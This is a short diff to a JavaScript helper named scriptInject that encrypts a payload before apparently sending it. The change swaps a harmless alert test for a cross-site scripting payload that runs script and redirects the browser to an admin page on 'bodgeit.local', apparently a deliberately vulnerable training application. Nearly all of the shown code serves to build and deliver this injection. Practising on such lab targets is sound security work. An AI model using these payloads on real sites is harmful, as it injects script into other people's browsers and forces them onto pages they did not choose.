@@ -1,5 +1,5 @@
 function scriptInject(payload){
-  payload = 'price:<script>' + payload + '</script>';
+  payload = ':' + payload + '';
   console.log(payload);
 
   encrypted_payload = Aes.Ctr.encrypt(payload, key, 128);
@@ -18,4 +18,5 @@ function scriptInject(payload){
   });
 
 }
-scriptInject('alert(1)');
+//scriptInject('<script>alert("1337");</script>');
+scriptInject('<script>alert("1337");window.location="http://bodgeit.local:8080/admin.jsp"</script>');
